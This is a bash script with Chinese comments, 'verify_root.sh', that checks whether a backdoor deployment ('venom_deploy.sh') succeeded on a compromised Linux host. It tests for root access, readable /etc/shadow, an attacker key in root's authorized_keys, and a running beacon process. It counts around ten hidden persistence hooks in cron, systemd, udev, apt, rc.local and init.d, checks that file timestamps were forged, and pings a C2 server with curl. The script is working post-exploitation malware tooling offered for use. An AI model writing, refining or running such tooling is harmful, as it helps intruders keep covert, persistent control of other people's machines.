#!/bin/bash
# verify_root.sh v2.6 — 部署/提权验证器（参数化，读部署配置）
# v2.6: 修 --all 顺序 bug（函数统一定义在分支之前）；结构合并为单一 run_one
# 用法:
#   verify_root.sh [TAG]           # 指定 TAG（默认读 /tmp/.venom_last）
#   verify_root.sh --all           # 全机扫描所有 /usr/lib/.TAG 配置
set -u
PASS=0; FAIL=0; WARN=0
ok(){ echo "  [PASS] $*"; PASS=$((PASS+1)); }
no(){ echo "  [FAIL] $*"; FAIL=$((FAIL+1)); }
warn(){ echo "  [WARN] $*"; WARN=$((WARN+1)); }

# ---- 函数统一定义（修 v2.5 --all 顺序 bug）----
run_one(){
  local cfg="$1"
  . "$cfg"
  echo "===== 验证: TAG=$TAG BASE=$BASE ====="
  echo "-- root 权限 --"
  [ "$(id -u)" = 0 ] && ok "uid=0 root" || no "非 root (uid=$(id -u))"
  [ -r /etc/shadow ] && ok "可读 /etc/shadow" || warn "shadow 不可读"
  [ -f /root/.ssh/authorized_keys ] && ok "AK 存在" || no "AK 缺失"

  echo "-- 进程 --"
  ALIVE=0
  if [ -f "$BASE/.pid" ]; then p=$(cat "$BASE/.pid" 2>/dev/null); kill -0 "$p" 2>/dev/null && ALIVE=1; fi
  [ "$ALIVE" = 1 ] && ok "sync(beacon) 运行中 pid=$p" || no "sync 未运行"
  pgrep -f "$BASE/mgr.sh" >/dev/null 2>&1 && ok "mgr(心脏) 触发链在" || warn "mgr 当前无实例（cron 会拉起，属正常）"

  echo "-- 触发源 --"
  C=0
  [ -f /etc/cron.d/zz-$TAG ] && C=$((C+1))
  [ -f /etc/profile.d/zz-$TAG.sh ] && C=$((C+1))
  [ -f /etc/rc.local ] && grep -q "$BASE/mgr.sh" /etc/rc.local 2>/dev/null && C=$((C+1))
  crontab -l 2>/dev/null | grep -q "zz-$TAG" && C=$((C+1))
  [ -f /etc/systemd/system/zz-$TAG-mgr.service ] && C=$((C+1))
  [ -f /etc/systemd/system/zz-$TAG-t.timer ] && C=$((C+1))
  [ -f /etc/systemd/system-generators/zz-$TAG-gen ] && C=$((C+1))
  [ -f /etc/udev/rules.d/80-zz-$TAG.rules ] && C=$((C+1))
  [ -f /etc/apt/apt.conf.d/80zz-$TAG ] && C=$((C+1))
  [ -f /etc/init.d/zz-$TAG ] && C=$((C+1))
  ok "触发源存活 $C/10+"

  echo "-- 白名单 --"
  [ -f "$BASE/keys.pub" ] && ok "白名单 keys.pub 在 (共 $(wc -l < "$BASE/keys.pub") 把)" || no "keys.pub 缺失"
  K0=$(head -1 "$BASE/keys.pub" 2>/dev/null)
  if [ -n "$K0" ]; then grep -qF -- "$K0" /root/.ssh/authorized_keys 2>/dev/null && ok "主钥在 AK" || no "主钥不在 AK"; fi

  echo "-- mtime 一致性 --"
  REF=$(stat -c %y /etc/hostname 2>/dev/null)
  M=$(stat -c %y "$BASE/mgr.sh" 2>/dev/null)
  if [ -n "$REF" ] && [ -n "$M" ]; then
    R1=$(date -d "$REF" +%s 2>/dev/null); M1=$(date -d "$M" +%s 2>/dev/null)
    D=$((M1-R1)); [ "${D#-}" -le 2 ] 2>/dev/null && ok "mgr.sh mtime 对齐基线" || warn "mgr.sh mtime 偏差 ${D}s"
  else
    warn "mtime 无法读取"
  fi

  echo "-- C2 连通 --"
  if command -v curl >/dev/null 2>&1; then
    H=$(curl -s -m 8 -o /dev/null -w '%{http_code}' "$C2/" 2>/dev/null)
    [ -n "$H" ] && [ "$H" != "000" ] && ok "C2 可达 ($H)" || warn "C2 不可达"
  fi
  echo "----- TAG=$TAG 结果: PASS=$PASS FAIL=$FAIL WARN=$WARN -----"
}

# ---- 入口分发（函数已定义完毕）----
if [ "${1:-}" = --all ]; then
  for c in /usr/lib/.[!.]*/.cfg; do [ -f "$c" ] && run_one "$c"; done
  echo "===== 总结果: PASS=$PASS FAIL=$FAIL WARN=$WARN ====="
  exit $([ "$FAIL" = 0 ] && echo 0 || echo 1)
fi

CFG=
if [ -n "${1:-}" ]; then
  CFG="/usr/lib/.$1/.cfg"
elif [ -f /tmp/.venom_last ]; then
  CFG="$(cat /tmp/.venom_last 2>/dev/null)/.cfg"
fi
[ -z "$CFG" ] || [ ! -f "$CFG" ] && { echo "[FAIL] 找不到部署配置（先跑 venom_deploy.sh，或指定 TAG）"; exit 1; }

run_one "$CFG"
exit $([ "$FAIL" = 0 ] && echo 0 || echo 1)
